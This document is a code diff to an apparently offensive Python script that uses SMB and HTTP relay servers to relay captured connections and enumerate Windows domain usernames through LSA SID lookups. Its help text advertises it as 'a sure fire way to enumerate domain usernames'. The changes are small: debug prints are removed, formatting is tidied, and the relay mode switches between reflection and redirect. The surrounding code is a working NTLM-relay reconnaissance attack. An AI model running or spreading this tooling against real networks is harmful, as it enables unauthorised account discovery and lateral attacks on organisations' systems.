@@ -34,12 +34,9 @@ class SMBAttack(Thread):
     def run(self):
         global getting_usernames
         global got_usernames
-        print "1 getting_usernames: " + str(getting_usernames)
         if getting_usernames:
-            print "2 getting_usernames: " + str(getting_usernames)
             return
         getting_usernames = True
-        print "3 getting_usernames: " + str(getting_usernames)
         rpctransport = transport.SMBTransport(self.__SMBConnection.getRemoteHost(), filename=r'\lsarpc',
                                               smb_connection=self.__SMBConnection)
         dce = rpctransport.get_dce_rpc()
@@ -100,8 +97,8 @@ class SMBAttack(Thread):
             for n, item in enumerate(resp['TranslatedNames']['Names']):
                 if item['Use'] != SID_NAME_USE.SidTypeUnknown:
                     line = "%d: %s\\%s (%s)" % (
-                    soFar + n, resp['ReferencedDomains']['Domains'][item['DomainIndex']]['Name'], item['Name'],
-                    SID_NAME_USE.enumItems(item['Use']).name)
+                        soFar + n, resp['ReferencedDomains']['Domains'][item['DomainIndex']]['Name'], item['Name'],
+                        SID_NAME_USE.enumItems(item['Use']).name)
                     print line
                     if fh:
                         fh.write(line + '\n')
@@ -313,7 +310,7 @@ class SAMRDump:
 
 
 if __name__ == '__main__':
-    RELAY_SERVERS = (SMBRelayServer,HTTPRelayServer)  # TODO: Maybe fix HTTP redirects later
+    RELAY_SERVERS = (SMBRelayServer, HTTPRelayServer)
     ATTACKS = {'SMB': SMBAttack}
 
     parser = argparse.ArgumentParser(description='A sure fire way to enumerate domain usernames')
@@ -345,7 +342,10 @@ if __name__ == '__main__':
         c.setOutputFile(args.out_file)
         c.setSMB2Support(True)
         c.setInterfaceIp('')
-        c.setMode('REFLECTION')
+        if server == HTTPRelayServer:
+            c.setMode('REFLECTION')
+        else:
+            c.setMode('REDIRECT')
         c.setRedirectHost(True)
 
         s = server(c)
